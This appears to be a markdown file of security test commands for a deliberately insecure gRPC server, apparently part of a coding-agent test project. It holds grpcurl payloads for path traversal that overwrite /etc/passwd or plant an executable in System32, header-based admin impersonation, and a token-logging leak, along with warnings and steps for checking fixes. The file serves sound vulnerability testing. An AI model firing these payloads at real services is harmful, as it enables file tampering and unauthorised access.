# Security Test Scripts

## Path Traversal Vulnerability Test

The following examples demonstrate the critical path traversal vulnerability identified in the `SetRecord` method:

### Example 1: Writing to arbitrary location
```bash
# This could write a malicious file to the system
grpcurl -plaintext -d '{
  "name": "test",
  "value": "malicious content",
  "path": "../../../tmp/hacked.txt"
}' localhost:5187 insecure.Insecure/SetRecord
```

### Example 2: Attempting to overwrite system files (Linux)
```bash
# DANGEROUS: Could overwrite critical system files if service has permissions
grpcurl -plaintext -d '{
  "name": "evil",
  "value": "hacked",
  "path": "../../../etc/passwd"
}' localhost:5187 insecure.Insecure/SetRecord
```

### Example 3: Windows path traversal
```bash
# DANGEROUS: Could write to Windows system directories
grpcurl -plaintext -d '{
  "name": "windows_attack",
  "value": "malicious executable",
  "path": "..\\..\\..\\Windows\\System32\\malicious.exe"
}' localhost:5187 insecure.Insecure/SetRecord
```

## Authentication Bypass Test

### User Impersonation via Headers
```bash
# Impersonate an administrator
grpcurl -plaintext \
  -H "x-impersonate: admin" \
  -d '{"name": "secret_data"}' \
  localhost:5187 insecure.Insecure/GetRecord

# Impersonate any user
grpcurl -plaintext \
  -H "x-user-id: victim_user" \
  -d '{"name": "sensitive_info"}' \
  localhost:5187 insecure.Insecure/GetRecord
```

## Information Disclosure Test

### Authorization Header Logging
```bash
# This will cause the server to log the authorization header
grpcurl -plaintext \
  -H "authorization: Bearer secret_token_12345" \
  -d '{"name": "test"}' \
  localhost:5187 insecure.Insecure/GetRecord
```

Check the server logs for the leaked authorization token.

## Setup Instructions for Testing

1. Install grpcurl:
   ```bash
   # Linux/macOS
   go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
   
   # Or download binary from: https://github.com/fullstorydev/grpcurl/releases
   ```

2. Start the vulnerable server:
   ```bash
   cd CopilotAgentTests/Grpc.Echo.Server
   dotnet run
   ```

3. Run the test commands above

## ⚠️ WARNING ⚠️
These tests are for demonstration purposes only and should NEVER be run against production systems. They demonstrate real security vulnerabilities that could cause system compromise.

## Mitigation Verification

After implementing security fixes, these same tests should fail or be blocked by the security controls.